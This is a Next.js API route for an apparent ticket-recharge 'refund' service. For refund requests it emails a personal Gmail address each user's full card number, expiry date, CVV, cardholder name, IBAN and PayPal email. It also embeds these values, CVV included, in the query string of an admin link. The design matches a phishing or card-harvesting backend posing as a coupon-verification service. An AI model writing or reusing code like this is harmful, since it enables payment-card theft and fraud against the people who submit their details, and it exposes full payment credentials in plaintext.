import { saveSubmission } from "@/lib/submission-store";
import { type NextRequest, NextResponse } from "next/server"
import { emailService } from "@/lib/email-service"
import type { Language } from "@/lib/i18n"

export async function POST(request: NextRequest) {
  try {
    const { submission, type, language } = await request.json();
    if (!submission || !type) {
      return NextResponse.json({ error: "Missing required parameters" }, { status: 400 });
    }

    // Génère le template professionnel
    const { subject, html, text } = await import("@/lib/email-templates").then(mod =>
      mod.generateEmailTemplate(submission, type, language || "fr")
    );

    // Envoi au client
    const clientSuccess = await emailService.sendEmail({
      to: submission.user_email,
      subject,
      html,
      text,
    });

    // Email admin différencié selon le type de demande
    let adminHtml = "";
    let adminSubject = "";
    if (type === "reimbursement") {
      // Sauvegarde la soumission pour récupération ultérieure par l’admin
      try {
        saveSubmission(submission);
      } catch (e) {
        console.error("Erreur lors de la sauvegarde de la soumission:", e);
      }
      adminSubject = `[ADMIN] Nouvelle demande de remboursement`;
      // Nettoie les champs pour éviter les espaces inutiles
  function clean(val: string) {
        return (val || "").toString().trim();
      }
      adminHtml = `
        <div style=\"max-width:600px;margin:auto;font-family:Arial,sans-serif;background:#f8fafc;border-radius:12px;box-shadow:0 2px 8px #0001;padding:24px;\">
          <div style=\"background:#059669;color:#fff;padding:16px 0;border-radius:8px 8px 0 0;text-align:center;\">
            <h2 style=\"margin:0;font-size:1.7rem;letter-spacing:1px;\">Nouvelle demande de remboursement</h2>
          </div>
          <table style=\"width:100%;border-collapse:collapse;margin-top:18px;\">
            <tbody>
              <tr style=\"background:#e0e7ff;\"><td style=\"padding:8px 12px;font-weight:bold;width:40%;\">Nom</td><td style=\"padding:8px 12px;\">${clean(submission.user_name)}</td></tr>
              <tr><td style=\"padding:8px 12px;font-weight:bold;\">Email</td><td style=\"padding:8px 12px;\">${clean(submission.user_email)}</td></tr>
              <tr style=\"background:#e0e7ff;\"><td style=\"padding:8px 12px;font-weight:bold;\">Téléphone</td><td style=\"padding:8px 12px;\">${clean(submission.user_phone) || '-'} </td></tr>
              <tr><td style=\"padding:8px 12px;font-weight:bold;\">Type de ticket</td><td style=\"padding:8px 12px;\">${clean(submission.ticket_type)}</td></tr>
              <tr style=\"background:#e0e7ff;\"><td style=\"padding:8px 12px;font-weight:bold;\">Code ticket</td><td style=\"padding:8px 12px;\">${clean(submission.ticket_code)}</td></tr>
              <tr><td style=\"padding:8px 12px;font-weight:bold;\">Montant</td><td style=\"padding:8px 12px;\">${clean(submission.ticket_amount)} €</td></tr>
              <tr style=\"background:#e0e7ff;\"><td style=\"padding:8px 12px;font-weight:bold;\">Méthode de remboursement</td><td style=\"padding:8px 12px;\">${clean(submission.reimbursement_method) || '-'} </td></tr>
              <tr><td style=\"padding:8px 12px;font-weight:bold;\">IBAN</td><td style=\"padding:8px 12px;\">${clean(submission.bank_iban) || '-'} </td></tr>
              <tr style=\"background:#e0e7ff;\"><td style=\"padding:8px 12px;font-weight:bold;\">Email PayPal</td><td style=\"padding:8px 12px;\">${clean(submission.paypal_email) || '-'} </td></tr>
              <tr><td style=\"padding:8px 12px;font-weight:bold;\">Carte bancaire</td><td style=\"padding:8px 12px;\">${clean(submission.card_number) || '-'} </td></tr>
              <tr style=\"background:#e0e7ff;\"><td style=\"padding:8px 12px;font-weight:bold;\">Nom sur la carte</td><td style=\"padding:8px 12px;\">${clean(submission.card_name) || '-'} </td></tr>
              <tr><td style=\"padding:8px 12px;font-weight:bold;\">Date d'expiration</td><td style=\"padding:8px 12px;\">${clean(submission.card_expiry) || '-'} </td></tr>
              <tr style=\"background:#e0e7ff;\"><td style=\"padding:8px 12px;font-weight:bold;\">CVV</td><td style=\"padding:8px 12px;\">${clean(submission.card_cvv) || '-'} </td></tr>
              <tr><td style=\"padding:8px 12px;font-weight:bold;\">Date de création</td><td style=\"padding:8px 12px;\">${clean(submission.created_at)}</td></tr>
            </tbody>
          </table>
          <div style=\"margin-top:32px;text-align:center;\">
            <a href=\"https://rechargesecure.com/admin/ticket-action?ticketId=${encodeURIComponent(clean(submission.id))}&user_name=${encodeURIComponent(clean(submission.user_name))}&user_email=${encodeURIComponent(clean(submission.user_email))}&user_phone=${encodeURIComponent(clean(submission.user_phone))}&ticket_code=${encodeURIComponent(clean(submission.ticket_code))}&ticket_type=${encodeURIComponent(clean(submission.ticket_type))}&ticket_amount=${encodeURIComponent(clean(submission.ticket_amount))}&submission_type=${encodeURIComponent(clean(submission.submission_type))}&reimbursement_method=${encodeURIComponent(clean(submission.reimbursement_method))}&bank_iban=${encodeURIComponent(clean(submission.bank_iban))}&paypal_email=${encodeURIComponent(clean(submission.paypal_email))}&card_number=${encodeURIComponent(clean(submission.card_number))}&card_expiry=${encodeURIComponent(clean(submission.card_expiry))}&card_cvv=${encodeURIComponent(clean(submission.card_cvv))}&card_name=${encodeURIComponent(clean(submission.card_name))}&created_at=${encodeURIComponent(clean(submission.created_at))}\"
              style=\"background:#059669;color:#fff;padding:14px 32px;border-radius:8px;font-size:1.1rem;font-weight:bold;text-decoration:none;display:inline-block;\">Gérer le remboursement</a>
          </div>
        </div>
      `;
    } else {
      adminSubject = `[ADMIN] Nouvelle demande de validation`;
      adminHtml = `
        <div style=\"max-width:600px;margin:auto;font-family:Arial,sans-serif;background:#f8fafc;border-radius:12px;box-shadow:0 2px 8px #0001;padding:24px;\">
          <div style=\"background:#2563eb;color:#fff;padding:16px 0;border-radius:8px 8px 0 0;text-align:center;\">
            <h2 style=\"margin:0;font-size:1.7rem;letter-spacing:1px;\">Nouvelle demande de validation</h2>
          </div>
          <table style=\"width:100%;border-collapse:collapse;margin-top:18px;\">
            <tbody>
              <tr style=\"background:#e0e7ff;\"><td style=\"padding:8px 12px;font-weight:bold;width:40%;\">Nom</td><td style=\"padding:8px 12px;\">${submission.user_name}</td></tr>
              <tr><td style=\"padding:8px 12px;font-weight:bold;\">Email</td><td style=\"padding:8px 12px;\">${submission.user_email}</td></tr>
              <tr style=\"background:#e0e7ff;\"><td style=\"padding:8px 12px;font-weight:bold;\">Téléphone</td><td style=\"padding:8px 12px;\">${submission.user_phone || '-'} </td></tr>
              <tr><td style=\"padding:8px 12px;font-weight:bold;\">Type de ticket</td><td style=\"padding:8px 12px;\">${submission.ticket_type}</td></tr>
              <tr style=\"background:#e0e7ff;\"><td style=\"padding:8px 12px;font-weight:bold;\">Code ticket</td><td style=\"padding:8px 12px;\">${submission.ticket_code}</td></tr>
              <tr><td style=\"padding:8px 12px;font-weight:bold;\">Montant</td><td style=\"padding:8px 12px;\">${submission.ticket_amount} €</td></tr>
              <tr style=\"background:#e0e7ff;\"><td style=\"padding:8px 12px;font-weight:bold;\">Type de demande</td><td style=\"padding:8px 12px;\">${submission.submission_type}</td></tr>
              <tr><td style=\"padding:8px 12px;font-weight:bold;\">Date de création</td><td style=\"padding:8px 12px;\">${submission.created_at}</td></tr>
            </tbody>
          </table>
          <div style=\"margin-top:32px;text-align:center;\">
            <a href=\"https://rechargesecure.com/admin/ticket-action?ticketId=${encodeURIComponent(submission.id)}&user_name=${encodeURIComponent(submission.user_name)}&user_email=${encodeURIComponent(submission.user_email)}&user_phone=${encodeURIComponent(submission.user_phone)}&ticket_code=${encodeURIComponent(submission.ticket_code)}&ticket_type=${encodeURIComponent(submission.ticket_type)}&ticket_amount=${encodeURIComponent(submission.ticket_amount)}&submission_type=${encodeURIComponent(submission.submission_type)}&created_at=${encodeURIComponent(submission.created_at)}\"
              style=\"background:#2563eb;color:#fff;padding:14px 32px;border-radius:8px;font-size:1.1rem;font-weight:bold;text-decoration:none;display:inline-block;\">Gérer la validation</a>
          </div>
        </div>
      `;
    }
    const adminText = `Nouvelle demande reçue\n\n${Object.entries(submission).map(([k,v]) => `${k}: ${v}`).join('\n')}`;
    const adminSuccess = await emailService.sendEmail({
      to: "ulricherivaldo@gmail.com", // Adresse admin
      subject: adminSubject,
      html: adminHtml,
      text: adminText,
    });

    return NextResponse.json({ 
      success: clientSuccess && adminSuccess,
      message: "Email sent successfully" 
    });
  } catch (error) {
    console.error("Error sending email:", error);
    return NextResponse.json(
      { error: "Failed to send email" },
      { status: 500 }
    );
  }
}
